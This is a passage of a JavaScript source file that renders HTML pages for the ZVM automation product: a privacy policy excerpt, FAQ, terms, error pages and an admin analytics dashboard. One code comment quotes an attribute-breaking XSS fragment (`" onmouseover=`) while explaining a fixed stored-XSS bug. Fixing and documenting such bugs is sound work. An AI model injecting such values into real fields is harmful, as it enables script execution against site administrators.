      <li>Webhooks e ações externas: somente para endereços configurados pelo próprio usuário</li>
      <li>Provedores de infraestrutura podem processar dados estritamente para hospedagem, banco de dados, entrega de e-mail e segurança do serviço</li>
    </ul>
    <p>Não vendemos ou alugamos dados pessoais. Não transferimos dados para redes de publicidade, data brokers ou serviços de crédito.</p>
  </section>
  <section class="doc-section" id="privacidade-retencao" aria-labelledby="heading-privacidade-retencao">
    <h2 id="heading-privacidade-retencao"><span class="sec-num">4</span>Armazenamento e retenção</h2>
    <ul>
      <li>Dados funcionais da extensão são armazenados localmente no navegador sempre que possível</li>
      <li>Conta, licença e informações necessárias ao licenciamento ficam armazenadas no backend da ZVM</li>
      <li>Logs operacionais e de segurança podem conter IP, chave/licença e data/hora, sem conteúdo de mensagens, e são mantidos por até 90 dias</li>
      <li>Credenciais de integrações configuradas na extensão são protegidas localmente e não entram em backups comuns</li>
    </ul>
  </section>
  <section class="doc-section" id="privacidade-seguranca" aria-labelledby="heading-privacidade-seguranca">
    <h2 id="heading-privacidade-seguranca"><span class="sec-num">5</span>Segurança</h2>
    <p>Adotamos medidas técnicas e organizacionais para proteger os dados:</p>
    <ul>
      <li>Senhas armazenadas com hash forte e salt, nunca em texto puro</li>
      <li>Comunicação com o backend via HTTPS/TLS</li>
      <li>Autenticação em dois fatores disponível no portal</li>
      <li>Sessões com expiração e controles de abuso</li>
      <li>Credenciais de integrações não são exibidas novamente após serem salvas</li>
    </ul>
  </section>
  <section class="doc-section" id="privacidade-direitos" aria-labelledby="heading-privacidade-direitos">
    <h2 id="heading-privacidade-direitos"><span class="sec-num">6</span>Seus direitos (LGPD)</h2>
    <p>De acordo com a Lei Geral de Proteção de Dados (Lei 13.709/2018), você pode solicitar:</p>
    <ul>
      <li>Acesso aos dados pessoais mantidos pela ZVM</li>
      <li>Correção de dados incompletos ou desatualizados</li>
      <li>Exclusão dos dados quando aplicável</li>
      <li>Revogação de consentimento e informações sobre o tratamento</li>
    </ul>
    <p>Para exercer esses direitos, entre em contato pelo suporte.</p>
  </section>
  <section class="doc-section" id="privacidade-cookies" aria-labelledby="heading-privacidade-cookies">
    <h2 id="heading-privacidade-cookies"><span class="sec-num">7</span>Cookies e rastreamento</h2>
    <p>O Portal do Cliente utiliza cookies essenciais de sessão. O site também guarda sua escolha de idioma em um cookie funcional. Esses cookies não são usados para publicidade nem para acompanhar sua navegação.</p>
  </section>
  <section class="doc-section" id="privacidade-google" aria-labelledby="heading-privacidade-google">
    <h2 id="heading-privacidade-google"><span class="sec-num">8</span>Chrome Web Store e Uso Limitado</h2>
    <p>O uso de informações recebidas por meio das APIs do Google seguirá a Política de Dados do Usuário da Chrome Web Store, incluindo os requisitos de Uso Limitado. A ZVM limita o tratamento de dados ao seu propósito declarado e às operações solicitadas pelo usuário.</p>
    <p>Google OAuth (em homologação): integrações futuras com Google Drive ou Google People API só poderão acessar dados após autorização específica do usuário. Antes de cada ativação, a ZVM deverá informar quais arquivos ou contatos serão acessados, para que finalidade, onde poderão ser tratados ou armazenados e como revogar o acesso. O uso dos dados recebidos das APIs do Google deve respeitar a Política de Dados do Usuário dos Serviços de API do Google e seus requisitos de Uso Limitado; a ativação ou disponibilidade geral dessas integrações ainda não é afirmada.</p>
  </section>
  <section class="doc-section" id="privacidade-contato" aria-labelledby="heading-privacidade-contato">
    <h2 id="heading-privacidade-contato"><span class="sec-num">9</span>Contato</h2>
    <p>Dúvidas sobre privacidade ou solicitações relacionadas a dados:<br>
    <a href="${ZVM_SUPPORT_URL}" class="privacy-contact" target="_blank" rel="noopener noreferrer">Falar com suporte</a></p>
  </section>
</div></div></main>
${_standaloneFoot()}

</body></html>`;
}

function applyStandaloneFrame(html, { activePath = '', portalUser = null, showBack = true } = {}) {
  return html
    .replace('</head>', `${_CSS_STANDALONE}</head>`)
    // Marcador de destino do skip-link: renderPrivacyPage/renderLandingPage
    // que não usam <main> recebem o alvo #main-content injetado
    // aqui, na única costura standalone-only já existente (troca da nav).
    .replace(/<nav class="znav">[\s\S]*?<\/nav>/, _sharedNav({ activePath, portalUser, showBack }) + '<div id="main-content"></div>')
    .replace(/<footer class="zfooter">[\s\S]*?<\/footer>/, _standaloneFoot());
}

// Landing standalone canônica: a copy e os preços já nascem corretos em
// renderLandingPage(); esta camada aplica apenas a moldura visual compartilhada.
function renderStandaloneLandingPage(portalUser = null) {
  return applyStandaloneFrame(renderLandingPage(portalUser), { activePath: '/', portalUser, showBack: false });
}

function renderStandaloneFaqPage(portalUser = null) {
  // FAQ copy remains the shared canonical ZVM_FAQ_ITEMS used by the portal.
  const groups = [
    ['compra', 'Compra e Licença', [_faqPick('Como recebo minha licença'), _faqPick('Preciso criar uma conta'), _faqPick('Preciso usar o mesmo e-mail'), _faqPick('Minha compra foi aprovada')]],
    ['produto', 'Produto e Recursos', [_faqPick('Como instalar e acessar'), _faqPick('Quantos números'), _faqPick('Como removo um dispositivo'), _faqPick('Como funciona o 2FA')]],
    ['conta', 'Conta e Acesso', [_faqPick('Onde encontro a versão oficial'), _faqPick('Esqueci minha senha'), _faqPick('Como falo com o suporte')]],
    ['licenca', 'Planos e Pagamentos', [_faqPick('Como renovo'), _faqPick('Posso alterar'), _faqPick('Onde vejo a validade'), _faqPick('Minha chave expirou'), _faqPick('Como vincular uma chave')]],
  ];
  const icons = Object.freeze({
    compra: '<path d="M3 4h2l2 10h11l2-7H6"/><circle cx="9" cy="19" r="1"/><circle cx="18" cy="19" r="1"/>',
    produto: '<rect x="3" y="3" width="18" height="18" rx="3"/><path d="M7 8h10M7 12h10M7 16h6"/>',
    conta: '<circle cx="12" cy="8" r="4"/><path d="M4 21v-2a8 8 0 0 1 16 0v2"/>',
    licenca: '<rect x="3" y="5" width="18" height="14" rx="3"/><path d="M3 10h18M7 15h5"/>',
  });
  const faqIcon = id => '<svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">'+(icons[id] || icons.produto)+'</svg>';
  const summaries = Object.freeze({
    compra:'Entrega de chave, e-mail e ativação da licença.',
    produto:'Instalação, dispositivos e utilização da ZVM.',
    conta:'Acesso à conta, segurança e canais de suporte.',
    licenca:'Planos, renovação e vinculação da chave.',
  });
  const tiles = groups.map(([id,title,items]) => `<a class="r4701-faq-tile" href="#faq-${id}"><span class="r4701-faq-tile-icon">${faqIcon(id)}</span><span class="r4701-faq-tile-body"><strong>${escHtml(title)}</strong><small>${escHtml(summaries[id])}</small></span><span aria-hidden="true" class="r4701-faq-tile-arrow">↗</span></a>`).join('');
  const total = groups.reduce((sum, group) => sum + group[2].length, 0);
  const topics = groups.map(([id, title, items], i) =>
    `<a class="r4700-topic-link" href="#faq-${id}"><span class="r4701-rail-icon">${faqIcon(id)}</span><span>${escHtml(title)}</span><span class="r4700-topic-count">${items.length}</span></a>`
  ).join('');
  const content = groups.map(([id, title, items], i) => `<section class="faq-group" id="faq-${id}" aria-labelledby="faq-heading-${id}">
    <div class="r4700-faq-group-head"><span class="r4701-group-icon">${faqIcon(id)}</span><div><h2 id="faq-heading-${id}">${escHtml(title)}</h2><p class="r4701-group-intro">${escHtml(summaries[id])}</p></div><span class="r4700-question-count">${items.length} perguntas</span></div>
    ${items.map(([q, a]) => `<details class="faq-item" data-faq-item><summary>${escHtml(q)}</summary><p>${escHtml(a)}</p></details>`).join('')}
  </section>`).join('');
  const pause = ZVM_SALES_PAUSED
    ? '<aside class="r4700-faq-pause" role="status"><strong>Vendas temporariamente suspensas.</strong> As informações sobre compra continuam disponíveis para consulta. Pedidos já pagos seguem em atendimento.</aside>'
    : '';
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Central de Ajuda e Perguntas Frequentes</title>
<meta name="description" content="Encontre orientações sobre compra sem login, entrega de chave, instalação, planos, dispositivos, conta e suporte da ZVM - Automações.">
<link rel="icon" type="image/svg+xml" href="${_FAV}">
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_FAQ}${_CSS_SYSTEM}${_CSS_PUBLIC_PREMIUM}${_CSS_SALES_STATE}${_CSS_PUBLIC_EXPERIENCE}${_CSS_REFERENCE_PUBLIC}
</head><body class="zvm-public-premium zvm-faq-premium zvm-experience">
${_sharedNav({activePath:'/faq',portalUser,showBack:true})}
<main id="main-content" class="r4700-faq-main">
  <header class="faq-hero r4701-faq-hero">
    <div class="r4701-faq-hero-text"><div class="faq-kicker">Suporte e ajuda</div>
    <h1>Central de Ajuda.<br><em>Encontre sua resposta.</em></h1>
    <p>Orientações sobre instalação, compra, ativação, planos e uso da ZVM. Tudo organizado para você resolver sua dúvida rapidamente.</p></div>
    <div class="r4701-question-art" aria-hidden="true"><span class="r4701-question-art-back"></span><span class="r4701-question-art-front"><span>?</span></span></div>
  </header>
  <div class="r4701-faq-top" aria-label="Busca e categorias da ajuda">      <form role="search" class="r4700-faq-search">
        <label for="faq-search">Buscar na Central de Ajuda</label>
        <div class="r4700-faq-search-field"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="11" cy="11" r="7"/><path d="m20 20-4-4"/></svg><input type="search" id="faq-search" placeholder="Buscar na Central de Ajuda..." autocomplete="off" aria-describedby="faq-result-status"></div>
        <kbd class="r4701-faq-shortcut" aria-hidden="true">Ctrl + K</kbd><p id="faq-result-status" role="status" aria-live="polite">${total} perguntas disponíveis.</p>
      </form>
    <div class="r4701-faq-top-title">Navegue por categoria</div>
    <nav class="r4701-faq-tile-grid" aria-label="Categorias de ajuda">${tiles}</nav>
  </div>
  ${pause}
  <div class="r4700-faq-layout">
    <aside class="r4700-faq-rail" aria-label="Navegação da central de ajuda">
      <div class="r4700-faq-rail-title">Categorias <span>${total} respostas</span></div>
      <nav class="r4700-faq-topics" aria-label="Assuntos frequentes">${topics}</nav>
      <div class="r4700-faq-rail-help"><span class="r4701-help-icon" aria-hidden="true">✳</span><strong>Precisa de mais ajuda?</strong><p>Fale com o suporte ZVM sobre instalação, ativação e vinculação de chaves.</p><a href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener noreferrer">Falar com o suporte <span aria-hidden="true">↗</span></a><ul><li>Suporte de ativação</li><li>Orientação de uso</li><li>Atendimento pelo canal oficial</li></ul></div>
    </aside>
    <div class="faq-wrap r4700-faq-content">

      <div id="faq-groups" class="r4700-faq-groups"><div class="r4701-questions-heading"><div><span>Respostas disponíveis</span><h2>Perguntas frequentes</h2><p>Selecione uma pergunta para visualizar a resposta.</p></div></div>${content}</div>
      <div id="faq-no-results" class="r4700-faq-empty" hidden><strong>Nenhuma pergunta encontrada.</strong><p>Tente outra palavra ou entre em contato com o suporte.</p></div>
      <aside class="faq-support"><div><strong>Ainda ficou com alguma dúvida?</strong><p>Fale com o atendimento ZVM sobre licenças, configuração ou acesso à ferramenta.</p></div><a href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener noreferrer">Abrir suporte <span aria-hidden="true">↗</span></a></aside>
    </div>
  </div>
</main>
${_standaloneFoot()}
<script src="/assets/zvm-faq-experience.5cf1ddccd700.js" defer></script>
</body></html>`;
}

// Tipografia do corpo do documento (renderPrivacyPage)
// já estava em 16px/1.85 — dentro do pedido. O resumo, os headings e a
// legenda de data ficavam menores que o corpo; ajuste só nesses pontos,
// via CSS extra anexado depois de _standaloneCss (mesma técnica de
// applyStandaloneFrame), sem tocar renderPrivacyPage.
function renderStandalonePrivacyPage(portalUser = null) {
  return renderPrivacyPage(portalUser);
}

function renderStandaloneTermsPage(portalUser = null, locale = 'pt-BR') {
  const lang = Object.hasOwn(TERMS.copy, locale) ? locale : 'pt-BR';
  const t = TERMS.copy[lang];
  const description = lang === 'en'
    ? 'ZVM - Automações Terms of Service covering licenses, billing, responsible messaging, privacy and integrations.'
    : lang === 'pt-PT'
    ? 'Termos de Serviço da ZVM - Automações: licenças, pagamentos, utilização responsável, privacidade e integrações.'
    : 'Termos de Serviço da ZVM - Automações: licenças, pagamentos, automações, privacidade e integrações.';
  const canonical = lang === 'pt-BR' ? '/termos' : '/termos?lang=' + lang;
  return `<!DOCTYPE html><html lang="${lang}"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — ${t.title}</title><meta name="description" content="${description}">
<link rel="canonical" href="https://zvm.onrender.com${canonical}">
<link rel="alternate" hreflang="pt-BR" href="https://zvm.onrender.com/termos">
<link rel="alternate" hreflang="pt-PT" href="https://zvm.onrender.com/termos?lang=pt-PT">
<link rel="alternate" hreflang="en" href="https://zvm.onrender.com/termos?lang=en">
<link rel="alternate" hreflang="x-default" href="https://zvm.onrender.com/termos">
<link rel="icon" type="image/svg+xml" href="${_FAV}">
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_PRIVACY}${_CSS_TERMS}${_CSS_SYSTEM}${_CSS_PUBLIC_PREMIUM}${_CSS_LEGAL_PREMIUM}</head>
<body class="zvm-terms-page zvm-public-premium zvm-legal-premium">${_sharedNav({activePath:'/termos',portalUser,showBack:true})}
<main id="main-content" class="terms-main">${renderTermsDocument(lang, ZVM_SUPPORT_URL)}</main>
${_standaloneFoot()}</body></html>`;
}

function renderStandalone404Page(portalUser = null) {
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Página não encontrada</title><meta name="robots" content="noindex"><link rel="icon" type="image/svg+xml" href="${_FAV}">${_GFONTS}
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_ERROR_404}${_CSS_SYSTEM}${_CSS_PUBLIC_PREMIUM}${_CSS_LEGAL_PREMIUM}</head><body class="zvm-public-premium zvm-error-premium zvm-404-premium">${_sharedNav({activePath:'',portalUser,showBack:false})}
<main id="main-content" class="err-wrap zvm-trust-error">
  <div class="zvm-error-grid"><div class="zvm-error-copy">
    <span class="zvm-error-kicker">Não encontramos esta página</span>
    <div class="err-code" aria-hidden="true">404</div>
    <h1 class="err-title">Essa página não existe.</h1>
    <p class="err-sub">O endereço pode ter mudado ou o link está desatualizado. Acesse uma das áreas oficiais da ZVM para continuar.</p>
    <div class="err-actions"><a href="/" class="err-btn-primary">Ir para a página inicial</a><a href="/faq" class="err-btn-outline">Central de Ajuda</a></div>
  </div>
  <aside class="zvm-error-aside" aria-label="Atalhos para continuar"><span aria-hidden="true" class="zvm-error-deco">◇</span>
    <h2>Por onde continuar?</h2>
    <a href="/planos"><strong>Planos e Licenças</strong><span>Consulte as ofertas e o estado das vendas</span></a>
    <a href="/cliente"><strong>Portal do Cliente</strong><span>Acesse sua conta e gerencie sua chave</span></a>
    <a href="/faq"><strong>Perguntas Frequentes</strong><span>Encontre orientações sobre a ferramenta</span></a>
  </aside></div>
</main>${_standaloneFoot()}</body></html>`;
}

function renderStandalone500Page(portalUser = null) {
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Indisponibilidade temporária</title><meta name="robots" content="noindex"><link rel="icon" type="image/svg+xml" href="${_FAV}">${_GFONTS}
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_ERROR_500}${_CSS_SYSTEM}${_CSS_PUBLIC_PREMIUM}${_CSS_LEGAL_PREMIUM}</head><body class="zvm-public-premium zvm-error-premium zvm-500-premium">${_sharedNav({activePath:'',portalUser,showBack:false})}
<main id="main-content" class="err-wrap zvm-trust-error zvm-error-500">
  <div class="zvm-error-grid"><div class="zvm-error-copy">
    <span class="zvm-error-kicker">Falha temporária do serviço</span>
    <div class="err-icon" aria-hidden="true">!</div>
    <h1 class="err-title">Estamos com uma indisponibilidade temporária.</h1>
    <p class="err-sub">Não foi possível concluir esta solicitação. Tente novamente ou entre em contato com o suporte se o problema continuar.</p>
    <div class="err-actions"><a href="/" class="err-btn-primary">Voltar à página inicial</a><a href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener noreferrer" class="err-btn-outline">Falar com suporte</a></div>
  </div><aside class="zvm-error-aside" aria-label="Ações seguras"><span class="zvm-error-deco" aria-hidden="true">✳</span>
    <h2>O que você pode fazer?</h2>
    <p>Confira o endereço e tente novamente mais tarde. Evite repetir pagamentos enquanto verifica uma operação pendente.</p>
    <a href="/faq"><strong>Consultar a Central de Ajuda</strong><span>Encontre respostas para dúvidas de acesso e licença</span></a>
    <a href="/cliente"><strong>Meu Portal do Cliente</strong><span>Gerencie licenças quando o serviço voltar</span></a>
  </aside></div>
</main>${_standaloneFoot()}</body></html>`;
}

function renderAnalyticsLogin(error = '') {
  const errHtml = error ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(error)}</div>` : '';
  const benefits = [
    ['📈','Visão executiva de receita, vendas e ticket médio'],
    ['👥','Retenção, recorrência e comportamento da base'],
    ['🧪','Laboratório isolado para testar os fluxos comerciais'],
    ['🔒','Painel privado com sessão administrativa dedicada'],
  ].map(([icon,text])=>`<li><span class="auth-benefit-icon" aria-hidden="true">${icon}</span><span>${text}</span></li>`).join('');
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Analytics</title><link rel="icon" type="image/svg+xml" href="${_FAV}">${_GFONTS}
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_AUTH}${_CSS_PRIVILEGED_AUTH}${_CSS_SYSTEM}</head>
<body class="zvm-auth-premium">
<main class="auth-shell zvm-privileged-auth-shell">
  <section class="auth-promo" aria-hidden="true"><div class="auth-promo-inner">
    <div class="auth-eyebrow">ZVM Analytics</div>
    <h1>Dados claros. <em>Decisões melhores.</em></h1>
    <p class="auth-promo-sub">Uma área privada para acompanhar a operação comercial sem misturar dados reais com testes.</p>
    <ul class="auth-benefits">${benefits}</ul>
  </div></section>
  <section class="auth-form-wrap"><div class="auth-form-card">
    <div class="auth-form-brand">${renderStandaloneBrand('auth')}</div>
    <h2>Acessar Analytics</h2>
    <p class="auth-form-hint">Entre com a credencial privada do painel de dados.</p>
    <div class="auth-secure-chip">Sessão protegida e isolada do portal</div>
    ${errHtml}
    <form method="POST" action="${R_ANALYTICS}/login">
      <div class="auth-field"><label for="analytics-pass">Senha de acesso</label><input id="analytics-pass" type="password" name="pass" required autofocus autocomplete="current-password" placeholder="Sua credencial privada"></div>
      ${ANALYTICS_TOTP_SECRET ? `<div class="auth-field"><label for="analytics-totp">Código 2FA</label><input id="analytics-totp" type="text" name="totp" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" autocomplete="one-time-code" class="zvm-privileged-totp-analytics"></div>` : ''}
      <button type="submit" class="auth-submit">Entrar no Analytics<span class="auth-spinner" aria-hidden="true"></span></button>
    </form>
    <div class="auth-footnote">Área restrita à administração da ZVM.</div>
  </div></section>
</main>
${_SCRIPT_PWD_TOGGLE}${_SCRIPT_AUTH_SUBMIT_LOCK}
</body></html>`;
}

async function renderAnalyticsDashboard(fixture = null) {
  const stats    = fixture?.stats || await getPaymentStats();
  const payments = fixture?.payments || await getPayments({ limit: 200 });
  const fmtBRL   = v => 'R$\u00a0' + (v||0).toFixed(2).replace('.',',');
  const fmtDate  = iso => iso ? new Date(iso).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}) : '—';
  // Usa o escHtml global: o antigo escH NÃO escapava aspas, e é usado dentro de
  // atributos (data-row="..."). Um clientName vindo do webhook com `" onmouseover=`
  // fechava o atributo e executava JS no painel de analytics (XSS armazenado).
  const escH     = escHtml;
  const escJs        = s => s.replace(/</g,'\\u003c');
  const byDayJson    = escJs(JSON.stringify(stats?.byDay     || []));
  const byProdJson   = escJs(JSON.stringify(stats?.byProduct || []));
  const byHourJson   = escJs(JSON.stringify(stats?.byHour    || []));
  const byMethodJson = escJs(JSON.stringify(stats?.byMethod  || []));

  const paymentsRows = payments.length ? payments.map(p => {
    const rowSearch = [p.clientName,p.clientEmail,p.productName,p.keyCode,p.paymentMethod,p.tracking?.compact].join('|').toLowerCase();
    const isTest = !!p.testMode;
    return `<tr data-row="${escH(rowSearch)}" data-paid="${escH(p.paidAt||'')}" data-test="${isTest?1:0}">
  <td>${fmtDate(p.paidAt)}</td>
  <td>${escH(p.clientName)}</td>
  <td style="color:#6b6b8a;font-size:12px">${escH(p.clientEmail)}</td>
  <td>${escH(p.productName)}</td>
  <td style="color:${p.approved?'#00ff87':'#ff4757'};font-weight:700">${fmtBRL(p.amount)}</td>
  <td><span class="badge ${p.approved?'bon':'boff'}">${p.approved?'APROVADO':'REJEITADO'}</span>${isTest?' <span class="badge btest">🧪 TESTE</span>':''}</td>
  <td style="color:#4f8ef7;font-size:12px">${escH(p.keyCode||'-')}</td>
  <td>${
    p.tracking && (p.tracking.src||p.tracking.medium||p.tracking.campaign||p.tracking.ref)
      ? `<div class="trk">${p.tracking.src?`<span class="trk-chip trk-src">🎯 ${escH(p.tracking.src)}</span>`:''}${p.tracking.medium?`<span class="trk-chip trk-med">📡 ${escH(p.tracking.medium)}</span>`:''}${p.tracking.campaign?`<span class="trk-chip trk-camp">📣 ${escH(p.tracking.campaign)}</span>`:''}${(!p.tracking.src&&p.tracking.ref)?`<span class="trk-chip trk-ref">🔗 ${escH(p.tracking.ref)}</span>`:''}</div>`
      : `<span style="color:var(--muted);font-size:13px">—</span>`
  }</td>
</tr>`;
  }).join('') : '<tr><td colspan="8" class="empty">Nenhuma venda registrada ainda.<br><span style="opacity:.75">Novas vendas aparecerão aqui automaticamente.</span></td></tr>';

  const topClientsRows = (stats?.topClients||[]).map(c =>
    `<tr><td>${escH(c._id)}</td><td style="text-align:center;color:#00ff87;font-weight:700">${c.count}</td><td style="text-align:right;color:#00ff87">${fmtBRL(c.total)}</td></tr>`
  ).join('') || '<tr><td colspan="3" class="empty">Sem dados</td></tr>';

  // Visualizações renderizadas no servidor: sem Chart.js/CDN, portanto não
  // dependem de script externo nem entram em conflito com a CSP do painel.
  const clampNum = v => Number.isFinite(Number(v)) ? Number(v) : 0;
  const _dayMap = new Map((stats?.byDay||[]).map(x => [String(x._id||''), x]));
  const daySeries = Array.from({length:30}, (_,idx) => {
    const d = new Date(Date.now() - (29-idx)*86400000);
    const key = d.toISOString().slice(0,10);
    const x = _dayMap.get(key) || {};
    return { key, label:key.slice(5), count:clampNum(x.count), revenue:clampNum(x.revenue) };
  });
  function lineViz(series, valueKey='revenue') {
    const W=760,H=230,PX=22,PY=24,innerW=W-PX*2,innerH=H-PY*2;
    const vals=series.map(x=>clampNum(x[valueKey]));
    const max=Math.max(1,...vals);
    const pts=series.map((x,i)=>{
      const px=PX+(i/(Math.max(1,series.length-1)))*innerW;
      const py=PY+innerH-(clampNum(x[valueKey])/max)*innerH;
      return [px,py];
    });
    const poly=pts.map(p=>p.map(n=>n.toFixed(1)).join(',')).join(' ');
    const area=`${PX},${H-PY} ${poly} ${W-PX},${H-PY}`;
    const grid=[.25,.5,.75,1].map(t=>`<line x1="${PX}" y1="${(PY+innerH-innerH*t).toFixed(1)}" x2="${W-PX}" y2="${(PY+innerH-innerH*t).toFixed(1)}" stroke="#17242b" stroke-width="1"/>`).join('');
    const labels=series.map((x,i)=>i%7===0||i===series.length-1?`<text x="${pts[i][0].toFixed(1)}" y="${H-4}" text-anchor="middle" fill="#64736f" font-size="10" font-family="Outfit, sans-serif">${escH(x.label)}</text>`:'').join('');
    const last=vals[vals.length-1]||0;
    return `<div class="viz-frame"><svg class="viz-svg" viewBox="0 0 ${W} ${H}" role="img" aria-label="Evolução de receita nos últimos 30 dias">${grid}<polygon points="${area}" fill="rgba(14,232,137,.07)"/><polyline points="${poly}" fill="none" stroke="#13e88b" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>${labels}</svg><div class="viz-caption"><span>Pico: ${fmtBRL(max)}</span><span>Último dia: ${fmtBRL(last)}</span></div></div>`;
  }
  function horizontalBars(items, valueKey, formatter, emptyText='Sem dados suficientes') {
    if(!items.length) return `<div class="viz-empty">${emptyText}</div>`;
    const max=Math.max(1,...items.map(x=>clampNum(x[valueKey])));
    return `<div class="metric-bars">${items.slice(0,6).map((x,i)=>{const v=clampNum(x[valueKey]);const pct=Math.max(3,Math.round(v/max*100));return `<div class="metric-bar-row"><div class="metric-bar-head"><span>${escH(x._id||'Outros')}</span><strong>${formatter(v)}</strong></div><div class="metric-bar-track"><span style="width:${pct}%"></span></div></div>`}).join('')}</div>`;
  }
  function hourViz(items) {
    const map=new Map((items||[]).map(x=>[String(x._id).padStart(2,'0'),clampNum(x.count)]));
    const vals=Array.from({length:24},(_,i)=>map.get(String(i).padStart(2,'0'))||0),max=Math.max(1,...vals);
    return `<div class="hour-bars" aria-label="Vendas por hora">${vals.map((v,i)=>`<div class="hour-col" title="${String(i).padStart(2,'0')}h · ${v} venda(s)"><span style="height:${Math.max(5,Math.round(v/max*100))}%"></span><small>${i%3===0?String(i).padStart(2,'0'):''}</small></div>`).join('')}</div>`;
  }
  const salesTrendViz = lineViz(daySeries,'revenue');
  const salesDailyTable = `<details class="analytics-chart-data">
    <summary>Ver dados diarios de vendas e receita em tabela</summary>
    <div class="ov"><table><caption>Vendas e receita dos ultimos 30 dias</caption>
      <thead><tr><th scope="col">Data</th><th scope="col">Vendas</th><th scope="col">Receita</th></tr></thead>
      <tbody>${daySeries.map(x=>`<tr><th scope="row">${escH(x.key)}</th><td>${x.count}</td><td>${fmtBRL(x.revenue)}</td></tr>`).join('')}</tbody>
    </table></div></details>`;
  const productViz = horizontalBars(stats?.byProduct||[], 'revenue', fmtBRL, 'Ainda não há receita por produto.');
  const hourChartViz = hourViz(stats?.byHour||[]);
  const methodViz = horizontalBars(stats?.byMethod||[], 'count', v=>`${v} venda${v===1?'':'s'}`, 'Ainda não há métodos de pagamento registrados.');
  const topProduct = (stats?.byProduct||[]).slice().sort((a,b)=>clampNum(b.revenue)-clampNum(a.revenue))[0];
  const peakHour = (stats?.byHour||[]).slice().sort((a,b)=>clampNum(b.count)-clampNum(a.count))[0];

  return `<!DOCTYPE html><html lang="pt-BR" data-analytics-root="${escHtml(R_ANALYTICS)}"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Analytics</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23080810'/%3E%3Ctext x='50%25' y='54%25' dominant-baseline='middle' text-anchor='middle' font-family='monospace' font-weight='700' font-size='14' fill='%2300ff87'%3EZVM%3C/text%3E%3C/svg%3E">
<link rel="stylesheet" href="/assets/zvm-analytics-dashboard.623a7bbac134.css">
<link rel="stylesheet" href="/assets/zvm-analytics-lab.40519085ae68.css">
<link rel="stylesheet" href="/assets/zvm-r46-system.aa366d924866.css">
<link rel="stylesheet" href="/assets/zvm-action-hub.07aa17b87c3e.css">${_CSS_ANALYTICS_PREMIUM}</head><body class="zvm-analytics-premium">
<a class="analytics-skip" href="#analytics-main">Pular para o conteudo principal</a>
<div class="analytics-shell">
<aside class="analytics-rail" aria-label="Navegação do Analytics">
  <div class="analytics-rail-brand">${renderStandaloneBrand('compact')}<div class="analytics-rail-kicker">Analytics privado</div></div>
  <nav class="analytics-nav" aria-label="Secoes do Analytics">
    <a class="active" href="#overview">◫ Visão executiva</a>
    <a href="#performance">↗ Performance</a>
    <a href="#customers">◎ Clientes</a>
    <a href="#payments">▤ Pagamentos</a>
  </nav>
  <div class="analytics-rail-card"><strong>Sessão protegida</strong><span>Dados reais e simulações permanecem identificados separadamente.</span></div>
</aside>
<div class="analytics-workspace">
<header class="analytics-topbar">
  <div class="analytics-title"><span>ZVM Analytics</span><strong>Visão executiva</strong></div>
  <div class="analytics-actions">
    <button type="button" class="btn lab-toggle" id="lab-toggle" aria-controls="lab-body" aria-expanded="false" onclick="toggleLab()">◇ Laboratório</button>
    ${renderZvmActionHub('analytics')}
  </div>
</header>
<main id="analytics-main" tabindex="-1">
  <section class="analytics-hero" id="overview">
    <div><span class="analytics-hero-kicker">Operação comercial</span><h1>O que está acontecendo com a receita da ZVM.</h1><p>Receita, recorrência, produtos e pagamentos organizados para leitura rápida — com testes claramente isolados dos dados reais.</p></div>
    <div class="analytics-hero-pulse">
      <div class="analytics-pulse"><span>Receita 30 dias</span><strong class="green">${fmtBRL(stats?.revenueLast30||0)}</strong></div>
      <div class="analytics-pulse"><span>Clientes</span><strong>${stats?.uniqueClients||0}</strong></div>
      <div class="analytics-pulse"><span>Ticket médio</span><strong>${stats?.total ? fmtBRL((stats.revenueTotal||0)/stats.total) : 'R$ 0,00'}</strong></div>
      <div class="analytics-pulse"><span>Retenção</span><strong>${stats?.retentionRate||0}%</strong></div>
    </div>
  </section>

  <!-- KPIs principais -->
  <div class="stats" id="overview-metrics">
    <div class="sc"><div class="sc-icon">💰</div><div class="n">${fmtBRL(stats?.revenueTotal||0)}</div><div class="l">Receita Total</div><div class="sub-n">${fmtBRL(stats?.revenueLast30||0)} últimos 30d</div></div>
    <div class="sc"><div class="sc-icon">🛒</div><div class="n">${stats?.total||0}</div><div class="l">Total de Vendas</div><div class="sub-n">${stats?.last30||0} últimos 30d</div></div>
    <div class="sc"><div class="sc-icon">📈</div><div class="n">${stats?.last7||0}</div><div class="l">Vendas 7 dias</div><div class="sub-n">${fmtBRL(stats?.revenueLast7||0)}</div></div>
    <div class="sc"><div class="sc-icon">🎯</div><div class="n">${stats?.total ? fmtBRL((stats.revenueTotal||0)/stats.total) : 'R$\u00a00,00'}</div><div class="l">Ticket Médio</div></div>
